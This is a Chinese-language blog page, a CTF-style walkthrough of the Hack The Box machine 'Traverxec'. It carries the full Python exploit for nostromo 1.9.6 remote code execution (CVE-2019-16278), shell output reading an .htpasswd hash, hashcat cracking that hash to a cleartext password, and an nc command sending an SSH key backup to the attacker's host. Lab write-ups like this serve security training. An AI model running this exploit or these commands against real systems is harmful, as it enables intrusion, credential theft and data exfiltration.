@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Crack id_rsa,nostromo,nostromo 1.9.6,CVE-2019-16278,Cisco IOS Hash,nostromo conf,suid,journalctl,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介Nostromo中间件拿到初始访问权限，理解账号Nostromo配置文件的含义得到david shell，suid提权。靶机的难点在于理解并利用Nostromo配置文件，如果之前不了解Nostromo中间件，这块可能会成为最耗时的地方，另外，英文真的很重要，要学习了。">
+<meta name="keywords" content="Crack id_rsa,nostromo,nostromo 1.9.6,CVE-2019-16278,Cisco IOS Hash,nostromo conf,suid,journalctl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Linux Traverxec">
+<meta property="og:url" content="https://exexute.github.io/2020/01/20/HTB-Linux-Traverxec/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介Nostromo中间件拿到初始访问权限，理解账号Nostromo配置文件的含义得到david shell，suid提权。靶机的难点在于理解并利用Nostromo配置文件，如果之前不了解Nostromo中间件，这块可能会成为最耗时的地方，另外，英文真的很重要，要学习了。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB Linux Traverxec">
+<meta name="twitter:description" content="简介Nostromo中间件拿到初始访问权限，理解账号Nostromo配置文件的含义得到david shell，suid提权。靶机的难点在于理解并利用Nostromo配置文件，如果之前不了解Nostromo中间件，这块可能会成为最耗时的地方，另外，英文真的很重要，要学习了。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2020/01/20/HTB-Linux-Traverxec/">
+
+
+
+
+
+  <title>HTB Linux Traverxec | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2020/01/20/HTB-Linux-Traverxec/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB Linux Traverxec</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-20T07:41:00+08:00">
+                2020-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>Nostromo中间件拿到初始访问权限，理解账号Nostromo配置文件的含义得到david shell，suid提权。靶机的难点在于理解并利用Nostromo配置文件，如果之前不了解Nostromo中间件，这块可能会成为最耗时的地方，另外，英文真的很重要，要学习了。<br><a id="more"></a></p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p><strong>1.端口扫描</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Sat Jan 11 17:13:53 2020 as: nmap -sC -sV -p22,80 --script=vuln -oA scan/Traverxec-vuln 10.10.10.165</span></span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos:</span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.10.10.165)</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nostromo 1.9.6</span><br><span class="line">| http-csrf:</span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=localhost</span><br><span class="line">|   Found the following possible CSRF vulnerabilities:</span><br><span class="line">|</span><br><span class="line">|     Path: http://localhost:80/</span><br><span class="line">|     Form id: contact-name</span><br><span class="line">|_    Form action: empty.html</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">'t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-server-header: nostromo 1.9.6</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2011-3192:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Apache byterange filter DoS</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  OSVDB:74721  CVE:CVE-2011-3192</span><br><span class="line">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="line">|       overlapping byte ranges are requested.</span><br><span class="line">|     Disclosure date: 2011-08-19</span><br><span class="line">|     References:</span><br><span class="line">|       http://osvdb.org/74721</span><br><span class="line">|       http://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="line">|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|_      http://nessus.org/plugins/index.php?view=single&amp;id=55976</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sat Jan 11 17:24:08 2020 -- 1 IP address (1 host up) scanned in 615.20 seconds</span></span><br></pre></td></tr></table></figure>
+<p>22端口，ssh服务，版本<code>OpenSSH 7.9p1 Debian 10+deb10u1</code></p>
+<p>80端口，http服务，版本<code>nostromo 1.9.6</code></p>
+<p><strong>2.查中间件版本历史漏洞</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit nostromo 1.9</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                       |  Path</span><br><span class="line">                                                                                                                     | (/usr/<span class="built_in">local</span>/opt/exploitdb/share/exploitdb/)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">nostromo 1.9.6 - Remote Code Execution                                                                               | exploits/multiple/remote/47837.py</span><br><span class="line">nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                 | exploits/linux/remote/35466.sh</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">Papers: No Result</span><br></pre></td></tr></table></figure>
+<p>OpenSSh 7.9版本不存在问题，直接看nostromo，nostromo是一个开源的WEB<a href="http://www.nazgul.ch/dev_nostromo.html" target="_blank" rel="noopener">中间件</a>，版本1.9.3和1.9.6在2019年爆出了RCE，可以尝试利用。</p>
+<h4 id="nostromo-RCE"><a href="#nostromo-RCE" class="headerlink" title="nostromo RCE"></a>nostromo RCE</h4><p>使用47837.py，该exp默认运行在python2环境中，由于python3中socket套接字中发送和接收的数据都必须为utf-8格式，于是将原始exp的发送和接收的数据进行decode和encode即可，如下 ：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-12-31</span></span><br><span class="line"><span class="comment"># Exploit Author: Kr0ff</span></span><br><span class="line"><span class="comment"># Vendor Homepage:</span></span><br><span class="line"><span class="comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.9.6</span></span><br><span class="line"><span class="comment"># Tested on: Debian</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16278</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">art = <span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                        _____-2019-16278</span></span><br><span class="line"><span class="string">        _____  _______    ______   _____\    \</span></span><br><span class="line"><span class="string">   _____\    \_\      |  |      | /    / |    |</span></span><br><span class="line"><span class="string">  /     /|     ||     /  /     /|/    /  /___/|</span></span><br><span class="line"><span class="string"> /     / /____/||\    \  \    |/|    |__ |___|/</span></span><br><span class="line"><span class="string">|     | |____|/ \ \    \ |    | |       \</span></span><br><span class="line"><span class="string">|     |  _____   \|     \|    | |     __/ __</span></span><br><span class="line"><span class="string">|\     \|\    \   |\         /| |\    \  /  \</span></span><br><span class="line"><span class="string">| \_____\|    |   | \_______/ | | \____\/    |</span></span><br><span class="line"><span class="string">| |     /____/|    \ |     | /  | |    |____/|</span></span><br><span class="line"><span class="string"> \|_____|    ||     \|_____|/    \|____|   | |</span></span><br><span class="line"><span class="string">        |____|/                        |___|/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">help_menu = <span class="string">'\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(soc)</span>:</span></span><br><span class="line">    response = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            connection = soc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(connection) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += connection.decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve</span><span class="params">(target, port, cmd)</span>:</span></span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, int(port)))</span><br><span class="line">    payload = <span class="string">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1'</span>.format(cmd)</span><br><span class="line">    soc.send(payload.encode())</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    ans = receive.split(<span class="string">'\r\n\r\n\r\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    print(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(art)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            cmd = input(<span class="string">'owef &gt; '</span>)</span><br><span class="line">            <span class="keyword">if</span> cmd <span class="keyword">in</span> [<span class="string">'exit'</span>, <span class="string">'quit'</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            cve(target, port, cmd)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        print(help_menu)</span><br></pre></td></tr></table></figure></p>
+<p>拿到shell后，开始收集机器信息：</p>
+<ul>
+<li>用户信息 ：david、root</li>
+<li>系统及内核版本：<code>Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</code></li>
+<li>WEB目录相关配置：<code>/var/nostromo/conf/nhttpd.conf</code>、<code>/var/nostromo/conf/.htpasswd</code>，找到cisco ios密码（特征：\$1\$)</li>
+<li>sudoer配置：<code>sudo -l</code>，需要密码，无法利用</li>
+<li>home目录、root目录中可读可写的文件：<code>find /home -perm -004 2&gt;/dev/null</code>，未查到；</li>
+</ul>
+<p><code>/var/nostromo/conf/.htpasswd</code>内容如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">owef &gt; ls /var/nostromo</span><br><span class="line">conf</span><br><span class="line">htdocs</span><br><span class="line">icons</span><br><span class="line">logs</span><br><span class="line"></span><br><span class="line">owef &gt; ls /var/nostromo/conf</span><br><span class="line">mimes</span><br><span class="line">nhttpd.conf</span><br><span class="line"></span><br><span class="line">owef &gt; ls /var/nostromo/conf/nhttpd.conf</span><br><span class="line">/var/nostromo/conf/nhttpd.conf</span><br><span class="line"></span><br><span class="line">owef &gt; cat /var/nostromo/conf/nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line"></span><br><span class="line">servername		traverxec.htb</span><br><span class="line">serverlisten		*</span><br><span class="line">serveradmin		david@traverxec.htb</span><br><span class="line">serverroot		/var/nostromo</span><br><span class="line">servermimes		conf/mimes</span><br><span class="line">docroot			/var/nostromo/htdocs</span><br><span class="line">docindex		index.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">logpid			logs/nhttpd.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line"></span><br><span class="line">user			www-data</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">htaccess		.htaccess</span><br><span class="line">htpasswd		/var/nostromo/conf/.htpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">/icons			/var/nostromo/icons</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs		/home</span><br><span class="line">homedirs_public		public_www</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">owef &gt; cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure>
+<p><strong>破解Cisco-IOS \$1\$ (MD5)</strong></p>
+<p>Cisco-IOS的MD5密码的特征为以”$1$”开头，于是使用hashcat离线破解，如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将hash写入文件中</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/ &gt; david.hash</span><br><span class="line"><span class="comment"># crack</span></span><br><span class="line">$ hashcat -m 500 -a 0 -d 2 david.hash ../../../tools/Passwd_Attack/wordlists/rockyou.txt </span><br><span class="line"><span class="comment"># show</span></span><br><span class="line">$ hashcat -m 500 -a 0 -d 2 david.hash ../../../tools/Passwd_Attack/wordlists/rockyou.txt --show</span><br><span class="line"><span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/:Nowonly4me</span><br></pre></td></tr></table></figure></p>
+<p>拿到之后，尝试登陆ssh，失败 ；可能是个兔子洞？继续收集其他信息，无果，后来在朋友的提示下重新看<code>/var/nostromo/conf/nhttpd.conf</code>文件，查<a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;topic=nhttpd" target="_blank" rel="noopener">官方文档 </a>，从官方文档可以看到，如果配置了 <code>homedirs</code>选项，则可以通过”~用户名”的方式在web端访问 home目录中的内容，如：”<a href="http://10.10.10.165/~david/&quot;" target="_blank" rel="noopener">http://10.10.10.165/~david/&quot;</a></p>
+<p>访问之后，发现提示：<code>Private space. Nothing here. Keep out!</code>于是用gobuster开始枚举目录，用了很多歌字典都没有成功；从shell直接访问david目录，也是没有权限。继续看配置文件说明，配置文件里有一句很重要的话：”You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.”，这句话的意思是，如果只想开放某一个目录，可以通过<code>homedirs_public</code>参数指定/home/\&lt;user>/\&lt;public_dir>，所以，如果通过该参数指定了某一目录，则该目录一定在/home目录下也存在。</p>
+<p>如果只设置了<code>homedirs</code>参数，则homedirs目录下的所有文件夹、文件都可以通过WEB访问到，但是</p>
+<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls /var/nostromo</span><br><span class="line">ls /var/nostromo/conf</span><br><span class="line"></span><br><span class="line">cat /var/nostromo/conf/nhttpd.conf</span><br><span class="line"></span><br><span class="line">cat /var/nostromo/conf/.htpasswd</span><br><span class="line"></span><br><span class="line">find / -name &quot;*.tgz&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）"><a href="#细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）" class="headerlink" title="细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）"></a>细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）</h4><p><a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;topic=nhttpd" target="_blank" rel="noopener">config</a><br>配置文件关键内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HOMEDIRS</span><br><span class="line">To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:</span><br><span class="line">http://www.nazgul.ch/~hacki/</span><br><span class="line">The content of the home directory is handled exactly the same way as a directory in your document root. If some users don&apos;t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.</span><br><span class="line">You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果配置了homedirs目录，则可以通过~加home目录名访问到对应用户的home目录，如下：<a href="http://10.10.10.165/~david/，home目录下文件的解析方式与document" target="_blank" rel="noopener">http://10.10.10.165/~david/，home目录下文件的解析方式与document</a> root目录下文件的解析方式相同</li>
+<li>如果某个用户不想让自己的home目录被通过http访问到，可以移除所有用户读取的标志，此时通过WEB访问将获得403响应 </li>
+<li>如果用户在他的home目录中创建了.htaccess文件，调用者访问时将需要进行认证</li>
+<li>如果指定了homedirs_public选项，则只能访问home目录中homedirs_public指定的目录，如：访问<a href="http://10.10.10.165/~david/时实际上访问的是&quot;/home/david/public_www&quot;目录" target="_blank" rel="noopener">http://10.10.10.165/~david/时实际上访问的是&quot;/home/david/public_www&quot;目录</a></li>
+<li>nostromo服务通过user选项指定的用户(www-data)进行启动，如果可以通过WEB访问到/home/david/public_www目录，则说明www-data用户具有/home/david/public_www目录的读取权限，可直接通过shell进行访问</li>
+</ul>
+<p>通过shell访问/home/david/public_www目录，找到protected-file-area目录，在该目录下，找到backup-ssh-identity-files.tgz文件；</p>
+<p>通过nc传送到本地：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">$ nc -lvvp 4444 &gt; backup-ssh-identity-files.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.10.10.165</span></span><br><span class="line">$ nc 10.10.14.151 4444 &lt; backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure>
+<p>解压taz文件，拿到david用户的公钥私钥</p>
